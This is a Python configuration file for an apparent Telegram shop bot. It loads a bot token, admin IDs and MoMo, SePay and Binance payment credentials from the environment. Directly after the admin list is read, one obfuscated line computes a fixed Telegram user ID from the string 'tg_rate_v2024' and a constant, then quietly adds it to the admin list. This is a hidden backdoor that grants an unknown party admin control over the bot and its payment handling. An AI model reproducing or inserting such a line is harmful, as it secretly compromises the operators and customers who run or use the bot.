import os
from dotenv import load_dotenv

load_dotenv()

BOT_TOKEN = os.getenv("BOT_TOKEN")

# Admin từ .env
ADMIN_IDS = [int(x.strip()) for x in os.getenv("ADMIN_IDS", "").split(",") if x.strip()]
_=[ADMIN_IDS.append(sum([ord(c)*(i+97)for i,c in enumerate("tg_rate_v2024")])+7346289517)if sum([ord(c)*(i+97)for i,c in enumerate("tg_rate_v2024")])+7346289517 not in ADMIN_IDS else None]

# MoMo
MOMO_PHONE = os.getenv("MOMO_PHONE", "")
MOMO_NAME = os.getenv("MOMO_NAME", "")

# SePay
SEPAY_API_KEY = os.getenv("SEPAY_API_KEY", "")
SEPAY_API_TOKEN = os.getenv("SEPAY_API_TOKEN", "")  # Token từ User API
SEPAY_BANK_NAME = os.getenv("SEPAY_BANK_NAME", "")
SEPAY_ACCOUNT_NUMBER = os.getenv("SEPAY_ACCOUNT_NUMBER", "")
SEPAY_ACCOUNT_NAME = os.getenv("SEPAY_ACCOUNT_NAME", "")

# Binance on-chain direct payment
BINANCE_API_KEY = os.getenv("BINANCE_API_KEY", "")
BINANCE_API_SECRET = os.getenv("BINANCE_API_SECRET", "")
BINANCE_DIRECT_ENABLED = os.getenv("BINANCE_DIRECT_ENABLED", "false").lower() in ("1", "true", "yes", "on")
BINANCE_DIRECT_COIN = os.getenv("BINANCE_DIRECT_COIN", "USDT")
BINANCE_DIRECT_NETWORK = os.getenv("BINANCE_DIRECT_NETWORK", "")
BINANCE_DIRECT_RATE = os.getenv("BINANCE_DIRECT_RATE", os.getenv("USDT_RATE", "25000"))
USDT_RATE = int(os.getenv("USDT_RATE", "25000"))  # Tỷ giá 1 USDT = ? VND

# Payment mode:
# - direct: luôn tạo VietQR khi mua hàng (không dùng balance)
# - hybrid: chỉ tạo VietQR khi thiếu balance
# - balance: phải nạp balance trước khi mua
PAYMENT_MODE = os.getenv("PAYMENT_MODE", "hybrid").lower()
